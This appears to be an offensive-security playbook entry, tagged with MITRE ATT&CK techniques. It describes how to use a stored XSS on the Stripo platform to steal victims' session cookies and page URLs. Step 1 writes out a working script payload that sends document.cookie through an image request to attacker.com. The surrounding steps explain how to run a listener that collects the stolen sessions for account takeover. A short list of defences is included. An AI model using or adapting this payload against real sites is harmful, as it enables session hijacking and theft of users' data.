---
id: proc-stripo-xss-exfil-001
tags:
  - xss
  - exfiltration
  - data-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
updated_at: '2025-12-14T03:15:30.735Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
---
# Exfiltrate-User-Data-via-JavaScript

## Summary

This procedure uses the executed XSS payload to steal sensitive user data, such as session cookies or form inputs, from the victim's browser on the Stripo platform and send it to an attacker-controlled server.

## Description

With the JavaScript running in the victim's context post-XSS trigger, this procedure crafts payloads to access DOM elements, cookies, or local storage, then exfiltrates via HTTP requests. Common targets include auth tokens stored in cookies, enabling session hijacking. It builds on prior injection and assumes execution has occurred.

## Requirements

1. Active XSS execution in victim session
2. Attacker server (e.g., simple HTTP listener)
3. Knowledge of target data locations (e.g., document.cookie)

## Defense

Defensive measures and detection strategies:

- HttpOnly and Secure flags on cookies
- Network monitoring for unexpected outbound traffic
- Client-side encryption of sensitive data

## Objectives

1. Access victim-specific data
2. Transmit data covertly
3. Enable follow-on attacks like account takeover

## Instructions

### Step 1: Access Data in Payload

**Context**: Modify the stored payload to target specific data.

Use: `<script>var data = document.cookie + '|' + document.location; new Image().src='http://attacker.com/steal?'+data;</script>` to capture cookies and URL.

### Step 2: Execute and Send

**Context**: Ensure the payload runs on view.

When triggered, the script collects and sends data via img src or fetch to evade some filters.

### Step 3: Receive and Analyze

**Context**: Capture the exfiltrated information.

Set up a server to log GET parameters, reviewing for stolen session details.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Archive Collected Data]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Exfiltration]]
- [[data-theft]]
